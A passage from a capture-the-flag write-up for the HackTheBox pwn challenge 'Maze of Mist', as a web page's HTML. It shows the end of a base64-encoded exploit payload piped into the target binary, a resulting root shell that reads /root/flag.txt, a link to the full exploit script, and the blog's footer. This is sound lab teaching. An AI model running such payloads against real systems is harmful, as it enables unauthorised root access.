+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHrF//cwqAQIAKgECMrM//cAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM3V//cAqAQIAAAAAA
+AAAAB6xf/3AAAAADCoBAgQkAQI | base64 -d; cat) | /target
+Where to go, challenger? your fractured reflection is your only guide.
+&gt; whoami
+whoami
+
+
+root
+cat /root/flag.txt
+cat /root/flag.txt
+
+
+HTB{eSc4p1nG_tH3_m4zE_f0r_Fun_4nd_pR0f1t}
+</code></pre></div><p>The full exploit code is here: <a target="_blank" href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/Maze%20of%20Mist/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a></li><li><a href="#setup-environment">Setup environment</a></li><li><a href="#exploit-strategy">Exploit strategy</a></li><li><a href="#exploit-development">Exploit development</a></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
+<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
